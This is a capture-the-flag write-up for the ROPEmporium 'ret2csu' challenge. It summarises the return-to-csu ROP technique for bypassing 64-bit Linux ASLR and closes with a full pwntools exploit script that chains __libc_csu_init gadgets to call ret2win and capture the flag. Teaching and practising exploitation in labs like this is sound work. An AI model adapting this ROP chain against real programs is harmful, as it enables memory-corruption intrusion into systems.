
## Ret2csu
### Writeup
#### Explaining Ret2csu
Return-to-csu is a method introduced in a [paper](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf), which leaks the address of any attached library. The paper is very long, so I will do my best to summarise it here.

When you dynamically compile, code is attached to your ELF by the to actually be able to perform dynamic links. Since this attached code is the same everywhere (so long as the gcc version is the same - the version of gcc is older in the paper and as such, uses a different version of __libc_csu_init that uses more convenient registers/instructions), if we can find a nice ROP chain in this attached code, we know we will have that chain to use everywhere else. 

Looking under the __libc_csu_init tag in any ELF, there are two main gadgets. One that populates a bunch of registers, and one that calls a function using those registers. The gadgets discussed are shown here: 

> Gadget 1: ret2csu paper
```
pop %rbx; pop %rbp; pop %r12; pop %r13; pop %r14; pop %r15; retq
```
> Gadget 1: ROPEmporium ret2csu
```
pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
```
> Gadget 2: ret2csu paper
```
mov %r13,%rdx; mov %r14,%rsi ; mov %r15d,%edi ; callq *(%r12,%rbx,8)
```
> Gadget 2: ROPEmporium ret2csu
```
mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12 + rbx * 8]
```

The combination of these two gadgets actually allows us to leak the address of any attached libc functions, through say, calling write() with the address of reloc.write as the argument, hence leaking where write()/libc is in memory. This enables us to jump directly to say system() despite ASLR, without needing to brute force/guess.

#### Solving the challenge
> NOTE: Automated gadget finders like ROPGadget don't find gadget 2 discussed above, which is why we have to manually find it/know of it's existence through reading the paper

Unfortunately, our provided ELF is much less interesting, as the only functions in the plt table are ret2win() and pwnme(). This means that our goal is to use the universal ROP gadgets to fill the argument registers (%rdi, %rsi & %rdx), then simply call ret2win. 

While the chain seems easy at first (call gadget 1 then 2, aiming the call instruction at reloc.ret2win), remember that mov edi, r13d actually zeros the upper half of the register, making rdi store 0xdeadbeef instead of 0xdeadbeefdeadbeef. This means that we need to use the below gadget after our ret2csu chain to repopulate the %rdi register with our desired value before calling ret2win().

>  0x00000000004006a3 : pop rdi ; ret

Since we can't do anything useful with call qword, we need it to do nothing and let execution hit the ret instruction below it, to be able to use our next gadget. There are 3 challenges that block us however: 
1. Finding a value in memory that contains an address of code that has minimal impact.

If we look through the values stored in _DYNAMIC, we can see that there is an address in memory to _fini, which looks like this:

```
9: _fini ();
0x004006b4      sub      rsp,    8 ; [14] -r-x section size 9 named .fini
0x004006b8      add      rsp,    8
0x004006bc      ret
```

This is perfect because it basically does nothing then rets!

2. The two instructions below exist between the call qword and the ret instruction which throws our execution flow elsewhere if rbp != rbx + 1.

```
0x0040068d      add      rbx,    1
0x00400691      cmp      rbp,    rbx
```

This is trivial to beat, since we control both registers. We just need to make %rbx = 0 and %rbp = 1. Ideally these values because then %rbx won't contribute anything to the call qword calculation, letting us set r12 to _fini.

3. The instruction below:

> 0x00400696      add      rsp,    8

Also trivial to beat - you just need to recognise that this just means you need to add 8 bytes of junk to your chain to make sure that this instruction isn't making you skip using any needed gadgets/addresses.

### Exploit 
```
#!/bin/env python3
from pwn import *; 
print(f"[\033[95m\033[1m*\033[0m] \033[95m\033[1mSTARTING EXPLOIT\033[0m")

context.log_level = "info"
elf = context.binary = ELF("./ret2csu")
libelf = ELF("./libret2csu.so")
p = elf.process()

pop_rdi = 0x00000000004006a3 # pop rdi ; ret
pop_rbx_to_r15 = 0x0040069a # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
mov_n_call = 0x00400680 # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12 + rbx * 8]

deadbeef = 0xdeadbeefdeadbeef
cafebabe = 0xcafebabecafebabe
d00df00d = 0xd00df00dd00df00d
trash = 0x0000000000000000

ret2win_plt = 0x00400510 
reloc_ret2win = 0x601020
_fini = 0x00600e48 # found looking at _DYNAMIC

payload = flat(
    b"A" * 40,
    pop_rbx_to_r15,
    0, # rbx 
    1,
    _fini, # r12 
    trash,
    cafebabe,
    d00df00d,
    mov_n_call,
    trash,
    trash, 
    trash,
    trash,
    trash,
    trash,
    trash,
    pop_rdi,
    deadbeef,
    ret2win_plt 
)

p.recvuntil(b"> ")
p.sendline(payload)
flag = [w for w in p.recvall().split() if w.startswith(b"ROPE{")][0].decode()
print(f"[\033[92m*\033[0m] flag: \033[105m\033[97m{flag}\033[0m")
```

